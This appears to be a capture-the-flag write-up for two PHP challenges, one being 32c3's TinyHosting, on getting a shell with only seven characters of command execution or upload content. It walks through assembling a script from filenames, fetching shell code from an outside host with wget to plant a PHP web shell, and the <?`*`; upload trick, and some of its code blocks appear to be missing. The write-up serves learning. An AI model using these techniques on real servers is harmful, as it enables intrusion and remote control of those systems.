###Seven chars to get shell

If you meet the following sense, how can you get shell?

How about this one?

In fact, the second one is the challenge named TinyHosting in the 2015 32c3 ctf. I added some html code based on the primitive php code just for convenience. Please note that you must have a directory named files with others write permissions in web directory.

The common in the two challenges is that you only have seven chars to make it.

The solutions

####0X00

In truth, the first time to solve them is difficult for me. So I found the write up and tried to make it. Let’s focus on the solution.

Oh my god! What I can do is only 7 chars. I can just execute some simple command, for example: ls /, pwd, whoami,sh file .

If you try to search the shortest php code to get shell in google, you will find the shortest <?=`$_GET[1]`?> whose length is more then 7. How about these one?

  1. 1=echo 1>1 8 chars
  2. 1=wget a.cn 9 chars

With >1 in shell, the new file named 1 will be created. If I can write all the filenames into a shell, the problem will not exist.

a.cn and 1.php are demo for explanation. I can use > followed by name to create files.

The reason that we created these file in a reverse order is I can only use seven chars. Command ls >1 output the filenames by default order instead of created time. Therefore I need this one ls -t>1. Output is the following.

Please pay attention to the \whitespace and \\. In shell, whitespace should be escaped and so is the backslash. I used the backslash to split command over multiple lines. On a.cn there is a default page with shell code prepared in advance.

Now I can get the the shell from a.cn by accessing http://ip/1=sh 1, then access the url http://ip/1.php for the shell.

summary

  • Why is this that the new file name(here it’s 1) was included when using command ls >1 ? The > always execute first, then redirect ls output to file 1.
  • In shell, whitespace and backslash \ should be always escaped, and the backslash can be used to split long command over multiple lines.
  • The file 1 with 1 on the first line will not affect the execution of the shell script. (Can someone give me more detail about this, XD)

####0X01

The key of the second challenge is I can upload any files with content limited within 7 chars. It looks so similar with the first one that I almost believe that’s truth.

There is a new file named index.html in every $savepath. I can upload the following files then execute command .

  1. bash any
  2. bb ls
  3. name.php <?`*`;

The left is filename, the right is content. <?`*`; is the key to execute command. Because it will execute all the files by order on current directory just like the following. Of course, you can change the name of file bash to sh but remember that you must always put the bash or sh file before the file with command you want execute.

In shell, there is a special process called expansion. Here is the explanation.

Each time you type a command line and press the enter key, bash performs several processes upon the text before it carries out your command. We have seen a couple of cases of how a simple character sequence, for example “*”, can have a lot of meaning to the shell. The process that makes this happen is called expansion.

First , the command`*` will be substituted by the name of files in current directory then bash bb index.html name.php will be executed. Is this a end to the `*` command? The output of the bash bb index.html name.php command will be returned to the main terminal and it’s still in the Command-Substitutation. So the command will be executed once again.
